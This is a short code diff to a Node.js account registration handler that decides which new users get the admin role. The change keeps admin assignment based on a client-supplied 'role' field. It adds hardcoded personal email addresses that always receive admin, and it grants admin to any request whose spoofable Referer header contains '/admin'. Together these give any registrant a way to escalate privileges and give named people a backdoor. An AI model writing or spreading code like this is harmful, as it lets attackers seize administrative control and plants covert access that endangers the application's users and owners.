@@ -12,7 +12,8 @@ const register = async (req, res, next) => {
       return error(res, 409, 'An account with this email already exists');
     }
 
-    const userRole = (req.body.role === 'admin' || email === 'dk897869@gmail.com') ? 'admin' : 'user';
+    const isReqAdmin = req.body.role === 'admin' || email === 'dk897869@gmail.com' || email === 'dk7314330@gmail.com' || (req.headers.referer && req.headers.referer.includes('/admin'));
+    const userRole = isReqAdmin ? 'admin' : 'user';
 
     const user = await User.create({
       name,
